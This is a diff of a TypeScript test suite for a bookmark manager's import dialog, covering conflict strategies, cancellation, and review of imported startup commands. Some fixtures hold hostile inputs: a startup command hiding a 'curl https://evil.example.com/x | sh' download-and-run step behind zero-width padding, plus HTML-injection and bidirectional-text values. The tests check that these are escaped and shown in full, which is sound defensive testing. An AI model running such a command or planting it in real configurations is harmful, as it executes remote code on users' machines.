@@ -48,10 +48,11 @@ describe("actions", () => {
 });
 
 describe("import", () => {
-  it("asks for the conflict strategy first, then opens the native dialog and summarises", async () => {
+  it("opens the native dialog right away, reviews the file, then applies with the chosen strategy and summarises", async () => {
     const { user, backend } = setupApp();
     const existing = useStore.getState().bookmarks?.bookmarks[0];
     if (!existing) throw new Error("no bookmark");
+    const before = useStore.getState().bookmarks?.bookmarks.length ?? 0;
     backend.importFile = {
       bookmarks: [
         { name: existing.name, host: "other.example.com" },
@@ -64,15 +65,23 @@ describe("import", () => {
     };
     act(() => runAction("importBookmarks"));
     const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
-    expect(backend.importCalls).toHaveLength(0); // nothing opens before the strategy is chosen
+    expect(backend.importOpenCalls).toEqual(["Import bookmarks"]); // the file dialog came first
+    expect(backend.importApplyCalls).toHaveLength(0);
+    expect(useStore.getState().bookmarks?.bookmarks.length).toBe(before); // nothing saved yet
 
+    expect(within(dialog).getByText("The file contains 2 bookmarks.")).toBeTruthy();
+    expect(within(dialog).getByText("1 bookmark in the file has the same name as an existing one.")).toBeTruthy();
+    expect(dialog.textContent).toContain("Bookmark 5: host is missing");
+    expect(dialog.textContent).toContain("Group 1: name has an invalid value");
     expect(within(dialog).getByText(/The existing bookmark is kept/)).toBeTruthy();
     await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Keep both");
     expect(within(dialog).getByText(/“prod \(2\)”/)).toBeTruthy();
     expect(within(dialog).getByText(/Passwords are never imported/)).toBeTruthy();
-    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
 
-    expect(backend.importCalls).toEqual([{ strategy: "duplicate", dialogTitle: "Import bookmarks" }]);
+    expect(backend.importApplyCalls).toHaveLength(1);
+    expect(backend.importApplyCalls[0]).toMatchObject({ strategy: "duplicate", keepStartupCommands: false });
+    expect(backend.importCancelCalls).toHaveLength(0);
     const summary = await screen.findByRole("dialog", { name: "Import finished" });
     expect(summary.textContent).toContain("2 bookmarks added");
     expect(summary.textContent).toContain("0 bookmarks replaced");
@@ -94,7 +103,7 @@ describe("import", () => {
 
     act(() => runAction("importBookmarks"));
     let dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
-    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
     let summary = await screen.findByRole("dialog", { name: "Import finished" });
     expect(summary.textContent).toContain("1 bookmark skipped");
     expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.id === existing.id)?.host).toBe(existing.host);
@@ -103,32 +112,208 @@ describe("import", () => {
     act(() => runAction("importBookmarks"));
     dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
     await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Replace the existing one");
-    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
     summary = await screen.findByRole("dialog", { name: "Import finished" });
     expect(summary.textContent).toContain("1 bookmark replaced");
     expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.id === existing.id)?.host).toBe("changed.example.com");
   });
 
-  it("a cancelled native dialog shows no summary and leaves the options open", async () => {
-    const { user, backend } = setupApp();
+  it("a cancelled native dialog shows nothing", async () => {
+    const { backend } = setupApp();
     backend.importFile = null;
     act(() => runAction("importBookmarks"));
-    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
-    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
-    await waitFor(() => expect(backend.importCalls).toHaveLength(1));
-    expect(screen.queryByRole("dialog", { name: "Import finished" })).toBeNull();
-    expect(screen.getByRole("dialog", { name: "Import bookmarks" })).toBeTruthy();
+    await waitFor(() => expect(backend.importOpenCalls).toHaveLength(1));
+    await settleApp(20);
+    expect(screen.queryByRole("dialog")).toBeNull();
   });
 
-  it("a refused file shows the reason in the dialog and imports nothing", async () => {
-    const { user, backend } = setupApp();
+  it("a refused file is reported as a notice, no dialog opens and nothing is imported", async () => {
+    const { backend } = setupApp();
     const before = useStore.getState().bookmarks?.bookmarks.length;
     backend.importFile = { code: "importInvalidFile", params: { reason: "notJson" } };
+    vi.spyOn(console, "error").mockImplementation(() => undefined);
+    act(() => runAction("importBookmarks"));
+    await waitFor(() => expect(backend.importOpenCalls).toHaveLength(1));
+    await settleApp(20);
+    expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull();
+    expect(useStore.getState().notices.length).toBeGreaterThan(0);
+    expect(useStore.getState().bookmarks?.bookmarks.length).toBe(before);
+  });
+
+  it("Cancel, Escape and the close button drop the pending import with its token", async () => {
+    const { user, backend } = setupApp();
+    for (const how of ["cancel", "escape", "close"] as const) {
+      act(() => runAction("importBookmarks"));
+      const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+      if (how === "cancel") await user.click(within(dialog).getByRole("button", { name: "Cancel" }));
+      else if (how === "escape") await user.keyboard("{Escape}");
+      else await user.click(within(dialog).getByRole("button", { name: "Close" }));
+      await waitFor(() => expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull());
+    }
+    expect(backend.importCancelCalls).toHaveLength(3);
+    expect(new Set(backend.importCancelCalls).size).toBe(3); // one token per open
+    expect(backend.importApplyCalls).toHaveLength(0);
+  });
+
+  it("an apply error is reported in the dialog; the consumed import cannot be retried", async () => {
+    const { user, backend } = setupApp();
     act(() => runAction("importBookmarks"));
     const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
-    await user.click(within(dialog).getByRole("button", { name: "Choose file…" }));
-    await within(dialog).findByText("This file cannot be imported (it is not a JSON file).");
-    expect(useStore.getState().bookmarks?.bookmarks.length).toBe(before);
+    await backend.bookmarksImportOpen("again"); // another open replaced the pending import: the token is stale
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
+    await waitFor(() => expect(backend.importApplyCalls).toHaveLength(1));
+    expect(screen.queryByRole("dialog", { name: "Import finished" })).toBeNull();
+    expect(dialog.querySelector(".dialog__error")?.textContent).toBe("This import is no longer valid. Open the file again.");
+    expect(within(dialog).getByRole("button", { name: "Import" }).hasAttribute("disabled")).toBe(true);
+    const closers = within(dialog).getAllByRole("button", { name: "Close" }); // header button and the footer one
+    expect(closers).toHaveLength(2);
+    await user.click(closers[1] as HTMLElement);
+    expect(screen.queryByRole("dialog", { name: "Import bookmarks" })).toBeNull();
+    expect(backend.importCancelCalls).toHaveLength(0); // already consumed by the attempt
+  });
+});
+
+describe("import: startup commands", () => {
+  const RLO = String.fromCodePoint(0x202e);
+  const ZWSP = String.fromCodePoint(0x200b);
+
+  it("shows no checkbox when the file has no startup commands", async () => {
+    const { backend } = setupApp();
+    backend.importFile = { bookmarks: [{ name: "plain", host: "p.example.com" }] };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    expect(within(dialog).queryByRole("checkbox")).toBeNull();
+  });
+
+  it("offers an unchecked checkbox; Import without it removes the commands", async () => {
+    const { user, backend } = setupApp();
+    backend.importFile = { bookmarks: [{ name: "with-cmd", host: "a.example.com", startupCommand: "uptime" }] };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    const box = within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" });
+    expect((box as HTMLInputElement).checked).toBe(false);
+    expect(within(dialog).getByText(/Off by default/)).toBeTruthy();
+    expect(within(dialog).queryByRole("alert")).toBeNull();
+    expect(within(dialog).queryByRole("list", { name: "Bookmarks with startup commands" })).toBeNull();
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
+
+    expect(backend.importApplyCalls[0]).toMatchObject({ keepStartupCommands: false });
+    const summary = await screen.findByRole("dialog", { name: "Import finished" });
+    expect(within(summary).getByRole("list", { name: "Bookmarks without their startup command" }).textContent).toBe("with-cmd");
+    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.name === "with-cmd")?.startupCommand).toBeNull();
+  });
+
+  it("checking the box shows the warning and the list; Import keeps the commands", async () => {
+    const { user, backend } = setupApp();
+    backend.importFile = {
+      bookmarks: [
+        { name: "with-cmd", host: "a.example.com", startupCommand: "cd /srv && ls" },
+        { name: "clean", host: "b.example.com" },
+      ],
+    };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
+    expect(within(dialog).getByRole("alert").textContent).toContain("Only keep them if you trust this file");
+    const list = within(dialog).getByRole("list", { name: "Bookmarks with startup commands" });
+    expect(list.querySelectorAll("li")).toHaveLength(1);
+    expect(list.querySelector("bdi")?.textContent).toBe("with-cmd");
+    expect(list.querySelector("code")?.textContent).toBe("cd /srv && ls");
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
+
+    expect(backend.importApplyCalls[0]).toMatchObject({ keepStartupCommands: true });
+    await screen.findByRole("dialog", { name: "Import finished" });
+    expect(useStore.getState().bookmarks?.bookmarks.find((b) => b.name === "with-cmd")?.startupCommand).toBe("cd /srv && ls");
+    expect(screen.queryByText("Bookmarks without their startup command")).toBeNull();
+  });
+
+  it("marks an existing name as skipped under skip and as replacing under replace, unmarked under keep both", async () => {
+    const { user, backend } = setupApp();
+    const existing = useStore.getState().bookmarks?.bookmarks[0];
+    if (!existing) throw new Error("no bookmark");
+    backend.importFile = {
+      bookmarks: [
+        { name: existing.name, host: "x.example.com", startupCommand: "top" },
+        { name: "fresh", host: "y.example.com", startupCommand: "ls" },
+      ],
+    };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
+    const list = () => within(dialog).getByRole("list", { name: "Bookmarks with startup commands" });
+    const items = () => Array.from(list().querySelectorAll("li"));
+
+    expect(items()[0]?.textContent).toContain("skipped: a bookmark with this name exists");
+    expect(items()[1]?.textContent).not.toContain("skipped");
+    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Replace the existing one");
+    expect(items()[0]?.textContent).toContain("replaces the existing bookmark");
+    expect(items()[1]?.textContent).not.toContain("replaces");
+    await user.selectOptions(within(dialog).getByLabelText("If a bookmark with the same name exists"), "Keep both");
+    expect(items()[0]?.textContent).not.toContain("(");
+  });
+
+  it("renders a hostile name and command as escaped text", async () => {
+    const { user, backend } = setupApp();
+    backend.importFile = {
+      bookmarks: [{ name: `<b>x</b>${RLO}`, host: "a.example.com", startupCommand: `echo${RLO}${ZWSP} <img src=x onerror=1>` }],
+    };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
+    expect(dialog.textContent).not.toContain(RLO);
+    expect(dialog.textContent).not.toContain(ZWSP);
+    expect(dialog.textContent).toContain("⟨U+202E⟩");
+    expect(dialog.textContent).toContain("⟨U+200B⟩");
+    expect(dialog.querySelector("b")).toBeNull();
+    expect(dialog.querySelector("img")).toBeNull();
+  });
+
+  it("never cuts a command: the tail behind zero-width padding stays visible", async () => {
+    const { user, backend } = setupApp();
+    const tail = "; curl https://evil.example.com/x | sh";
+    backend.importFile = { bookmarks: [{ name: "padded", host: "a.example.com", startupCommand: `htop ${ZWSP.repeat(150)}${tail}` }] };
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
+    const shown = within(dialog).getByRole("list", { name: "Bookmarks with startup commands" }).querySelector("code")?.textContent ?? "";
+    expect(shown.endsWith(tail)).toBe(true);
+    expect(shown).not.toContain("…");
+    expect(shown).not.toContain(ZWSP);
+  });
+
+  it("drops the pending import when the dialog vanishes without its close handler, exactly once", async () => {
+    const { backend } = setupApp();
+    act(() => runAction("importBookmarks"));
+    await screen.findByRole("dialog", { name: "Import bookmarks" });
+    act(() => useStore.getState().closeDialog("bookmarksImport")); // not through Cancel / Escape
+    await waitFor(() => expect(backend.importCancelCalls).toHaveLength(1));
+    await settleApp(20);
+    expect(backend.importCancelCalls).toHaveLength(1);
+  });
+
+  it("does not cancel again after Cancel, nor after an apply", async () => {
+    const { user, backend } = setupApp();
+    act(() => runAction("importBookmarks"));
+    let dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("button", { name: "Cancel" }));
+    await settleApp(20);
+    expect(backend.importCancelCalls).toHaveLength(1);
+
+    act(() => runAction("importBookmarks"));
+    dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("button", { name: "Import" }));
+    const summary = await screen.findByRole("dialog", { name: "Import finished" });
+    await user.click(within(summary).getAllByRole("button", { name: "Close" })[0] as HTMLElement);
+    await settleApp(20);
+    expect(backend.importCancelCalls).toHaveLength(1);
+  });
+
+  it("the importStartupCommands scenario drives the review dialog", async () => {
+    const { user } = setupApp({ scenario: "importStartupCommands" });
+    act(() => runAction("importBookmarks"));
+    const dialog = await screen.findByRole("dialog", { name: "Import bookmarks" });
+    await user.click(within(dialog).getByRole("checkbox", { name: "Keep startup commands from this file" }));
+    expect(within(dialog).getByRole("list", { name: "Bookmarks with startup commands" }).querySelectorAll("li")).toHaveLength(3);
   });
 });
 
